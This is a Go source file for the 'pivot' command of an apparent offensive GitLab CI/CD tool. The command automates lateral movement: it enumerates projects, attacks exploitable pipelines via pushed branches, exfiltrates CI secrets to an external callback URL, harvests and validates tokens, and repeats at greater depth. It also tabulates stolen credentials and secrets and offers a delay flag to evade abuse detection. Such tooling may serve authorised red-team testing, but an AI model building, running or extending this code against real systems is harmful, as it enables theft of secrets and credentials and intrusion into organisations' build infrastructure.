package cmd

import (
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/pivot"
	"github.com/mr-pmillz/gogatoz/pkg/store"
	"github.com/pterm/pterm"
	"github.com/spf13/cobra"
)

// Flags for pivot command
var (
	pivotTargets        []string
	pivotGroups         []string
	pivotExternalURL    string
	pivotListenAddr     string
	pivotRSAKeyPath     string
	pivotMaxDepth       int
	pivotMaxTargets     int
	pivotMaxCreds       int
	pivotTimeout        string
	pivotConcurrency    int
	pivotDryRun         bool
	pivotCleanup        bool
	pivotBranch         string
	pivotFollowIncl     bool
	pivotFetchRunners   bool
	pivotAttackDelay    string
	pivotReceiveTimeout string
)

var pivotCmd = &cobra.Command{
	Use:   "pivot",
	Short: "Automated lateral movement via CI/CD secrets exfiltration",
	Long: `Enumerate projects, identify exploitable CI/CD vulnerabilities, attack with
secrets exfiltration, harvest tokens from callbacks, and pivot to discover
additional access. Requires an external URL reachable from CI runners.

Workflow: enumerate → filter exploitable → attack (secrets exfil via HTTP) →
receive callback → extract tokens → validate → repeat at next depth.`,
	RunE: runPivot,
}

func runPivot(cmd *cobra.Command, _ []string) error {
	if len(pivotTargets) == 0 && len(pivotGroups) == 0 {
		return fmt.Errorf("at least one --target or --group is required")
	}
	if !pivotDryRun && strings.TrimSpace(pivotExternalURL) == "" {
		return fmt.Errorf("--external-url is required (URL reachable from CI runners)")
	}

	w := cmd.OutOrStdout()
	ctx := cmd.Context()

	timeout, err := time.ParseDuration(pivotTimeout)
	if err != nil {
		return fmt.Errorf("invalid --timeout: %w", err)
	}

	// Build client options (shared helper includes rate limit, retry,
	// user-agent, HTTP pool/timeouts, TLS, CA cert, SOCKS5 proxy).
	clOpts, err := buildClientOptions()
	if err != nil {
		return err
	}

	var attackDelay time.Duration
	if pivotAttackDelay != "" {
		attackDelay, err = time.ParseDuration(pivotAttackDelay)
		if err != nil {
			return fmt.Errorf("parse --attack-delay: %w", err)
		}
	}
	var receiveTimeout time.Duration
	if pivotReceiveTimeout != "" {
		receiveTimeout, err = time.ParseDuration(pivotReceiveTimeout)
		if err != nil {
			return fmt.Errorf("parse --receive-timeout: %w", err)
		}
	}

	opts := pivot.Options{
		ClientOptions:     clOpts,
		InitialTargets:    pivotTargets,
		GroupTargets:      pivotGroups,
		MaxDepth:          pivotMaxDepth,
		MaxTargets:        pivotMaxTargets,
		MaxCredentials:    pivotMaxCreds,
		Timeout:           timeout,
		AttackConcurrency: pivotConcurrency,
		AttackBranch:      pivotBranch,
		ListenAddr:        pivotListenAddr,
		ExternalURL:       pivotExternalURL,
		RSAKeyPath:        pivotRSAKeyPath,
		FollowIncludes:    pivotFollowIncl,
		FetchRunners:      pivotFetchRunners,
		DryRun:            pivotDryRun,
		Cleanup:           pivotCleanup,
		AttackDelay:       attackDelay,
		ReceiveTimeout:    receiveTimeout,
	}

	// Progress callback for PTerm output
	if !outputJSON {
		opts.Progress = func(e pivot.PivotEvent) {
			switch e.Type {
			case "depth_start":
				pterm.DefaultSection.WithLevel(2).Println(e.Message)
			case "enumerate":
				pterm.Info.Println(e.Message)
			case "attack":
				pterm.Warning.Println(e.Message)
			case "credential":
				pterm.Success.Println(e.Message)
			case "error":
				pterm.Error.Println(e.Message)
			case "depth_end":
				pterm.Info.Println(e.Message)
			}
		}
	}

	orch, err := pivot.NewOrchestrator(strings.TrimSpace(gitlabURL), token, opts)
	if err != nil {
		return fmt.Errorf("create orchestrator: %w", err)
	}

	stats, err := orch.Run(ctx)
	if err != nil {
		return fmt.Errorf("pivot: %w", err)
	}

	if cliStore != nil {
		if err := persistPivotResults(orch, stats); err != nil {
			pterm.Warning.Printfln("failed to persist pivot results: %v", err)
		}
	}

	if outputJSON {
		out := struct {
			*pivot.PivotStats
			ExfilData []pivot.ExfilEntry `json:"exfil_data,omitempty"`
		}{
			PivotStats: stats,
			ExfilData:  orch.ExfilData(),
		}
		return json.NewEncoder(w).Encode(out)
	}
	return renderPivotSummary(w, orch, stats)
}

func renderPivotSummary(w io.Writer, orch *pivot.Orchestrator, stats *pivot.PivotStats) error {
	fmt.Fprintln(w)
	data := pterm.TableData{
		{"Metric", "Value"},
		{"Projects Enumerated", fmt.Sprintf("%d", stats.ProjectsEnumerated)},
		{"Exploitable Targets", fmt.Sprintf("%d", stats.ExploitableTargets)},
		{"Projects Attacked", fmt.Sprintf("%d", stats.ProjectsAttacked)},
		{"Credentials Found", fmt.Sprintf("%d", stats.CredentialsFound)},
		{"Credentials Valid", fmt.Sprintf("%d", stats.CredentialsValid)},
		{"Max Depth Reached", fmt.Sprintf("%d", stats.MaxDepthReached)},
		{"Duration", stats.Duration.Round(time.Millisecond).String()},
	}
	if err := renderTable(w, data); err != nil {
		return err
	}

	creds := orch.Credentials().All()
	if len(creds) > 1 {
		fmt.Fprintln(w)
		pterm.DefaultSection.WithLevel(2).Println("Harvested Credentials")
		credData := pterm.TableData{{"Type", "Source Key", "Username", "Depth", "Valid"}}
		for _, c := range creds {
			if c.Depth == 0 {
				continue
			}
			valid := "no"
			if c.IsValid {
				valid = "yes"
			}
			credData = append(credData, []string{
				c.TokenType, c.SourceKey, c.Username,
				fmt.Sprintf("%d", c.Depth), valid,
			})
		}
		if err := renderTable(w, credData); err != nil {
			return err
		}
	}

	exfilData := orch.ExfilData()
	if len(exfilData) > 0 {
		fmt.Fprintln(w)
		pterm.DefaultSection.WithLevel(2).Println("Exfiltrated Secrets")
		exfilTable := pterm.TableData{{"Project", "Depth", "Key", "Value"}}
		for _, e := range exfilData {
			val := e.Value
			if len(val) > 80 {
				val = val[:77] + "..."
			}
			exfilTable = append(exfilTable, []string{
				e.ProjectPath, fmt.Sprintf("%d", e.Depth), e.Key, val,
			})
		}
		if err := renderTable(w, exfilTable); err != nil {
			return err
		}
	}
	return nil
}

func persistPivotResults(orch *pivot.Orchestrator, stats *pivot.PivotStats) error {
	if cliStore == nil {
		return nil
	}
	session := &store.ScanSession{
		GitLabURL: gitlabURL,
		StartedAt: time.Now().Add(-stats.Duration),
		Status:    "completed",
	}
	if err := cliStore.CreateSession(session); err != nil {
		return err
	}

	targets, _ := json.Marshal(pivotTargets)
	pivotSess := &store.PivotSession{
		SessionID:          session.ID,
		InitialTargets:     string(targets),
		MaxDepth:           pivotMaxDepth,
		MaxDepthReached:    stats.MaxDepthReached,
		ProjectsEnumerated: stats.ProjectsEnumerated,
		ProjectsAttacked:   stats.ProjectsAttacked,
		CredentialsFound:   stats.CredentialsFound,
		CredentialsValid:   stats.CredentialsValid,
		DurationMS:         stats.Duration.Milliseconds(),
		Status:             "completed",
	}
	if err := cliStore.SavePivotSession(pivotSess); err != nil {
		return err
	}

	// Save harvested credentials (hashes only)
	creds := orch.Credentials().All()
	var harvestedCreds []store.HarvestedCredential
	for _, c := range creds {
		if c.Depth == 0 {
			continue
		}
		scopes, _ := json.Marshal(c.Scopes)
		harvestedCreds = append(harvestedCreds, store.HarvestedCredential{
			TokenHash:       c.TokenHash,
			TokenType:       c.TokenType,
			SourceKey:       c.SourceKey,
			SourceProjectID: c.SourceProjectID,
			SourcePipeline:  c.SourcePipeline,
			Depth:           c.Depth,
			UserID:          c.UserID,
			Username:        c.Username,
			Scopes:          string(scopes),
			IsValid:         c.IsValid,
		})
	}
	if len(harvestedCreds) > 0 {
		if err := cliStore.SaveHarvestedCredentials(pivotSess.ID, harvestedCreds); err != nil {
			return err
		}
	}

	// Save all exfiltrated secrets
	exfilData := orch.ExfilData()
	if len(exfilData) > 0 {
		var secrets []store.ExfiltratedSecret
		for _, e := range exfilData {
			secrets = append(secrets, store.ExfiltratedSecret{
				SourceProjectID:   e.ProjectID,
				SourceProjectPath: e.ProjectPath,
				Depth:             e.Depth,
				Key:               e.Key,
				Value:             e.Value,
			})
		}
		if err := cliStore.SaveExfiltratedSecrets(pivotSess.ID, secrets); err != nil {
			return err
		}
	}
	return nil
}

func init() {
	pivotCmd.Flags().StringArrayVarP(&pivotTargets, "target", "t", nil, "Initial project targets (ID or path, repeatable)")
	pivotCmd.Flags().StringArrayVar(&pivotGroups, "group", nil, "Group IDs to expand")
	pivotCmd.Flags().StringVar(&pivotExternalURL, "external-url", "", "URL reachable from CI runners for callback")
	pivotCmd.Flags().StringVar(&pivotListenAddr, "listen", ":9443", "Callback server listen address")
	pivotCmd.Flags().StringVar(&pivotRSAKeyPath, "rsa-key", "", "Path to existing RSA private key (auto-generates if empty)")
	pivotCmd.Flags().IntVar(&pivotMaxDepth, "max-depth", 3, "Maximum pivot depth")
	pivotCmd.Flags().IntVar(&pivotMaxTargets, "max-targets", 50, "Maximum total projects to attack")
	pivotCmd.Flags().IntVar(&pivotMaxCreds, "max-credentials", 20, "Maximum credentials to harvest")
	pivotCmd.Flags().StringVar(&pivotTimeout, "timeout", "30m", "Overall timeout")
	pivotCmd.Flags().IntVar(&pivotConcurrency, "concurrency", 4, "Attack worker count")
	pivotCmd.Flags().BoolVar(&pivotDryRun, "dry-run", false, "Enumerate only, show exploitable targets without attacking")
	pivotCmd.Flags().BoolVar(&pivotCleanup, "cleanup", false, "Delete attack branches after harvest")
	pivotCmd.Flags().StringVar(&pivotBranch, "branch", "gogatoz-pivot", "Branch name base for attack")
	pivotCmd.Flags().BoolVar(&pivotFollowIncl, "follow-includes", false, "Resolve CI include directives transitively")
	pivotCmd.Flags().BoolVar(&pivotFetchRunners, "fetch-runners", false, "Fetch runner info for severity correlation")
	pivotCmd.Flags().StringVar(&pivotAttackDelay, "attack-delay", "", "Delay between attack launches (e.g. 2s, 500ms) to avoid abuse detection")
	pivotCmd.Flags().StringVar(&pivotReceiveTimeout, "receive-timeout", "", "Timeout for waiting for exfil callbacks per depth (default 5m)")

	rootCmd.AddCommand(pivotCmd)
}
